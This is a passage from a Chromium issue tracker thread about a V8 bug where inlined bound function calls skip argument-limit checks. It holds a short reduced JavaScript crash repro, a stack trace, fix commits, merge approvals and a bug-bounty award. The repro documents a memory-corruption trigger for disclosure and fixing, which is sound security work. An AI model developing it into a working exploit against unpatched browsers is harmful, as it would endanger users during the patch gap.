#24 0x0000555557cd4376 in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit ()
#25 0x0000555557dcc827 in Builtins_SetNamedPropertyHandler ()
#26 0x0000555557c28a81 in Builtins_InterpreterEntryTrampoline ()

Its trying to read the address stored in r13, which I think is derived from rcx, if I read the disassembly correctly.  When tinkering around with the write variant, trying to get a deterministic write I couldnt work out where rcx was coming from.


### ve...@chromium.org (2025-01-07)

The bug is that argument limits aren't checked for inlined bound function calls. Here's a reduced test for the topmost issue:

```
a.length = 65534;
function f() { return arguments }
var g = f.bind(...a);

function h() {
  return g(1,2);
}

%PrepareFunctionForOptimization(h);
%PrepareFunctionForOptimization(f);
h();
h();
%OptimizeFunctionOnNextCall(h);
h();

```

### al...@goodmanemail.com (2025-01-07)

After defining a so that it doesnt die 'not defined' I can replicate the check failed with the above repro :-)  Nothing exciting happens with those checks removed.

From trawling through the test cases and stepping through some of them I believe memory corruption, probably heap corruption is the source of what ensues.  However sadly this is all at the edge of my skillset; since I am just a person with too many servers and some time in the evening while I watch TV.

### ap...@google.com (2025-01-07)

Project: v8/v8  

Branch: main  

Author: Toon Verwaest <[verwaest@chromium.org](mailto:verwaest@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6149093>

[compiler] Check max-args when calling bound functions

---


Expand for full commit details
```
[compiler] Check max-args when calling bound functions 
 
Bug: 385155406 
Change-Id: I002547d8c4109b682ffb08ee7c4af6da4acaf2f6 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6149093 
Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
Auto-Submit: Toon Verwaest <verwaest@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#97966}

```

---

Files:

- M `src/compiler/js-call-reducer.cc`
- M `src/compiler/js-inlining.cc`

---

Hash: d35770876597b8c25de3c483b9368686f3a9fda8  

Date:  Tue Jan 07 13:35:04 2025


---

### al...@goodmanemail.com (2025-01-07)

I applied your patch to my build and none of that crash type are replicating in my triage.

I do still have 386857213 in my queue along with the previously mentioned jsarray null deref that I have not dug into yet.

### pe...@google.com (2025-01-07)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M132. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### al...@goodmanemail.com (2025-01-07)

I don't know if this needs back merging, but if it does then the labels are set wrong at the moment which means you automation is going break?

### 24...@project.gserviceaccount.com (2025-01-08)

ClusterFuzz testcase 5817760948879360 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_noflags&range=97965:97966

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### pe...@google.com (2025-01-08)

Merge review required: M132 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), alonbajayo (ChromeOS), srinivassista (Desktop)

### sp...@google.com (2025-01-09)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
$7,000 for report of memory corruption in a sandboxed process / renderer + $1,000 bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-01-09)

Congratulations, Alan. Thank you for your efforts and reporting this issue to us!

### al...@goodmanemail.com (2025-01-09)

Many thanks. I'm a bit scared that the rabbit is probably out of the hat on this one since the fix is on git and the issue impacts all the way back to m126 or m127 however the labels on here don't reflect that so the automation isn't trying to get the fix merged due to a CF run which replicated flaky and adjusted the labels?

### am...@chromium.org (2025-01-09)

Hi,

> I'm a bit scared that the rabbit is probably out of the hat on this one since the fix is on git and the issue impacts all the way back to m126 or m127 however the labels on here don't reflect that so the automation isn't trying to get the fix merged due to a CF run which replicated flaky and adjusted the labels?

I am presuming the proverbial rabbit you reference here is the existence of a fix on the public repo?
So since Chromium is open source, all fixes are landed in the public repro, even security issues regardless of how far back they impact. We know motivated attackers, brokers, and anyone looking to exploit the patch gap (the time between when a fix lands and when users update to a version of Chrome with the fix) can see these fixes and can work out a potential security issue. This is a known issue and why we work hard to keep the patch gap as short as possible by having weekly updates of Chrome, ushering important security fixes to users.

We don't, however, backmerge fixes any farther back beyond what branches / versions of Chrome we are currently supporting, therefore, only to oldest active release channel, also known as Extended Stable, which currently MM130.
So this fix would not be backmerged farther back than M130 in general. The last scheduled updates of Extended Stable (M130) and Stable (M131) were shipped on Tuesday. The next scheduled update of Chrome on Tuesday, the 14th, will also be the M132 Stable milestone release [1]. This is also when M132 is promoted to Stable and is also the next Extended Stable milestone.

Therefore, the automation is fine here with only requesting a backmerge for M132, which is why I have not changed any of the related milestone or foundin- fields, because I would have to go through the extra exercise of declining merges that are unnecessary.

While we also aim to keep the patch gap minimal, which is why we have weekly security updates of Chrome, we also do require some minimal bake time of the fix on Canary as to ensure there are no stability issues or other risks before backmerging to Beta and Stable versions of Chrome on which users have a operational / functional reliance on. This issue is appropriately tagged and is in our security queue for merge review once it reaches the minimal bake time threshold.

Hope this helps.

[1] <https://chromiumdash.appspot.com/schedule>

### al...@goodmanemail.com (2025-01-09)

Yes you are correct. I've not disclosed any details outside of here.

Thanks for explaining the details of the behind the scenes process.

### am...@chromium.org (2025-01-09)

It looks like this fix actually landed just after branch, so it also needs 133 merge.
No issues of note from time on canary; please merge this fix to 13.3 and 13.2 at your earliest convenience so this fix can be included in the first update of M132 (or the milestone release if M132 Stable RC is recut before next week's release.

### pb...@google.com (2025-01-10)

Your change has been approved to M133 branch, Please goahead and get the CL merged asap so that it would be part of next week M133 Beta promotion.

### pe...@google.com (2025-01-13)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### pb...@google.com (2025-01-15)

[Bulk Edit] Your changes have been approved for merging into the M133 branch. Please merge them as soon as possible to ensure they receive sufficient beta coverage and are included in next week's beta release.

### ap...@google.com (2025-01-16)

Project: v8/v8  

Branch: refs/branch-heads/13.3  

Author: Toon Verwaest <[verwaest@chromium.org](mailto:verwaest@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6179420>

Merged: [compiler] Check max-args when calling bound functions

---


Expand for full commit details
```
Merged: [compiler] Check max-args when calling bound functions 
 
Bug: 385155406 
(cherry picked from commit d35770876597b8c25de3c483b9368686f3a9fda8) 
 
Change-Id: I885419cccbbff103afdfee51fb7220aad863e90f 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6179420 
Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
Auto-Submit: Toon Verwaest <verwaest@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.3@{#16} 
Cr-Branched-From: 41dacffe436aeb9311879cb07648f1e36609a804-refs/heads/13.3.415@{#1} 
Cr-Branched-From: 3348638c0af67c885b30891a358c89a917ac9759-refs/heads/main@{#97937}

```

---

Files:

- M `src/compiler/js-call-reducer.cc`
- M `src/compiler/js-inlining.cc`

---

Hash: 5b7b826bd8e731cafa05a224e3edc12a8d0400fd  

Date:  Tue Jan 07 13:35:04 2025


---

### ap...@google.com (2025-01-16)

Project: v8/v8  

Branch: refs/branch-heads/13.2  

Author: Toon Verwaest <[verwaest@chromium.org](mailto:verwaest@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6175036>

Merged: [compiler] Check max-args when calling bound functions

---


Expand for full commit details
```
Merged: [compiler] Check max-args when calling bound functions 
 
Bug: 385155406 
(cherry picked from commit d35770876597b8c25de3c483b9368686f3a9fda8) 
 
Change-Id: I98c7166588f4099c5665ff94dc65da5c25be7535 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6175036 
Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
Auto-Submit: Toon Verwaest <verwaest@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.2@{#62} 
Cr-Branched-From: 24068c59cedad9ee976ddc05431f5f497b1ebd71-refs/heads/13.2.152@{#1} 
Cr-Branched-From: 6054ba94db0969220be4f94dc1677fc4696bdc4f-refs/heads/main@{#97085}

```

---

Files:

- M `src/compiler/js-call-reducer.cc`
- M `src/compiler/js-inlining.cc`

---

Hash: ca504d096c391272a3e323de709289b47e33afde  

Date:  Tue Jan 07 13:35:04 2025


---

### pe...@google.com (2025-01-16)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### qk...@google.com (2025-01-17)

Labeling as LTS-NotApplicable-126 because M126 doesn't have the suspected CL[1]. Besides the crash didn't happen on M126 according to the comment #5.

[1] https://chromium-review.googlesource.com/c/v8/v8/+/5577683

### ch...@google.com (2025-04-16)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/385155406)*
